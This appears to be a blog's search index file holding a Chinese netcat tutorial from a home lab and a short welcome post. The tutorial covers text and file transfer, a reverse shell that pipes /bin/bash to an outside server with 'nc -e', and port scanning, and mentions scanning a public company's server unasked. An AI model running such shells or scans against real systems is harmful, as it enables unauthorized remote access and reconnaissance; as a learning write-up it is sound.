@@ -1,0 +1,45 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>netcat的使用</title>
+      <link href="/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
+      <url>/2025/05/01/netcat%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>netcat简称nc,也被誉为网络安全界的瑞士军刀，正好这两天在很多大佬那学了点nc的操作，写篇文章纪念一下。</p><p>首先是nc的版本：<br>这台虚拟机的是kali系统，ip是192.168.17.131。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# nc -h </span><br><span class="line">[v1.10-48]</span><br></pre></td></tr></table></figure><p>另一台虚拟机为ubuntu系统，ip是192.168.10.10</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# nc -h</span><br><span class="line">OpenBSD netcat (Debian patchlevel 1.218-4ubuntu1)</span><br></pre></td></tr></table></figure><p>然后是外网的一台服务器，用的是centos系统，ip我将用Cip代替。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@CentOS ~]# nc -h</span><br><span class="line">1.229-1</span><br></pre></td></tr></table></figure><p>下面开始正式操作：</p><h2 id="文字传输"><a href="#文字传输" class="headerlink" title="文字传输"></a>文字传输</h2><h3 id="基本文字传输"><a href="#基本文字传输" class="headerlink" title="基本文字传输"></a>基本文字传输</h3><p>-首先在kali上开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp 222</span><br></pre></td></tr></table></figure><p>-然后在ubuntu上尝试连接kali的222端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.17.131 222</span><br></pre></td></tr></table></figure><p>可以看到连接成功了，接着输入一些文字。<br><img src="https://img.picui.cn/free/2025/04/27/680d95c01fcca.png"></p><p>在kali上可以看到监听到的信息。<br><img src="https://img.picui.cn/free/2025/04/27/680d95bfc72a1.png"></p><p>双方只要有一个键入ctrl+c就可以断开连接。</p><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>基于同样的原理，只需要利用重定向符，将文件内容重定向到nc的标准输入，就可以完成文件传输。<br><img src="https://img.picui.cn/free/2025/04/27/680d9df43fafc.png"><br><img src="https://img.picui.cn/free/2025/04/27/680d9df49c1d8.png"></p><h2 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h2><h3 id="基本命令交互"><a href="#基本命令交互" class="headerlink" title="基本命令交互"></a>基本命令交互</h3><p>-首先在kali上开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -p 222</span><br></pre></td></tr></table></figure><p>-然后在ubuntu上尝试连接kali的222端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vn 192.168.17.131 222</span><br></pre></td></tr></table></figure><p>然后就可以进行命令交互了<br><img src="https://img.picui.cn/free/2025/04/27/680da0e7443d2.png"><br><img src="https://img.picui.cn/free/2025/04/27/680da0e72ac44.png"></p><h2 id="内网弹-shell"><a href="#内网弹-shell" class="headerlink" title="内网弹 shell"></a>内网弹 shell</h2><p>-首先在服务器Centos上开启监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 2333</span><br></pre></td></tr></table></figure><p>-然后在kali上尝试连接服务器的2333端口,这里的Cip是服务器的ip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash Cip 2333</span><br></pre></td></tr></table></figure><p>然后就可以进行命令交互了<br><img src="https://img.picui.cn/free/2025/05/01/6812d3f6c5963.png"><br><img src="https://img.picui.cn/free/2025/05/01/6812d480131b1.png"></p><p>内网弹shell的原理是利用nc的-e参数，连接后执行指定的命令，这里是&#x2F;bin&#x2F;bash。</p><p>同理，如果内网的虚拟机是windows系统，就可以将&#x2F;bin&#x2F;bash替换为cmd.exe。</p><h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><p>nc的端口扫描并不是其主要功能，这里简单介绍一下</p><h3 id="扫描单个端口"><a href="#扫描单个端口" class="headerlink" title="扫描单个端口"></a>扫描单个端口</h3><p>扫描成功后可获取改端口的一些信息，如扫描80端口，可获取其一些服务器信息。（如果它没有做任何防护的话，大胆扫描了一下百度的80端口，结果啥都没得到…）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v Targetip 端口</span><br></pre></td></tr></table></figure><h3 id="扫描多个端口"><a href="#扫描多个端口" class="headerlink" title="扫描多个端口"></a>扫描多个端口</h3><p>速度会比较慢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -z Targetip 1-100</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 网络安全学习 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>建站成功啦！</title>
+      <link href="/2025/04/11/welcome-to-my-website/"/>
+      <url>/2025/04/11/welcome-to-my-website/</url>
+      
+        <content type="html"><![CDATA[<p>欢迎来到我的博客网站！<br>我是一个热爱技术和写作的博主，我将在这个这里分享我的技术经验，生活感悟。<br>希望能通过这个博客平台和大家互相交流。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 初来乍到 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
